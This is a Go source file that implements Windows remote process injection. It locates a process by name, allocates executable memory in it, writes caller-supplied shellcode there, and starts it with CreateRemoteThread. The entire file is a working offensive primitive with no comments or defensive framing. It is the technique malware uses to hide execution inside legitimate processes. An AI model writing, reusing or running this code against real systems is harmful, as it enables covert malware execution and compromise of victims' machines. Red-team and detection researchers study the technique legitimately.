package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	virtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory = kernel32.NewProc("WriteProcessMemory")
	createRemoteThread = kernel32.NewProc("CreateRemoteThread")
)

func findPID(name string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	err = windows.Process32First(snapshot, &pe)
	if err != nil {
		return 0, err
	}

	for {
		if windows.UTF16ToString(pe.ExeFile[:]) == name {
			return pe.ProcessID, nil
		}
		err = windows.Process32Next(snapshot, &pe)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return 0, err
		}
	}

	return 0, fmt.Errorf("process not found: %s", name)
}

func inject(pid uint32, shellcode []byte) error {
	handle, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess: %v", err)
	}
	defer windows.CloseHandle(handle)

	addr, _, err := virtualAllocEx.Call(
		uintptr(handle),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx: %v", err)
	}

	_, _, err = writeProcessMemory.Call(
		uintptr(handle),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)
	if err != nil && err.(syscall.Errno) != 0 {
		return fmt.Errorf("WriteProcessMemory: %v", err)
	}

	thread, _, err := createRemoteThread.Call(
		uintptr(handle),
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if thread == 0 {
		return fmt.Errorf("CreateRemoteThread: %v", err)
	}
	syscall.CloseHandle(syscall.Handle(thread))
	return nil
}

func injectInto(processName string, shellcode []byte) error {
	pid, err := findPID(processName)
	if err != nil {
		return err
	}
	return inject(pid, shellcode)
}
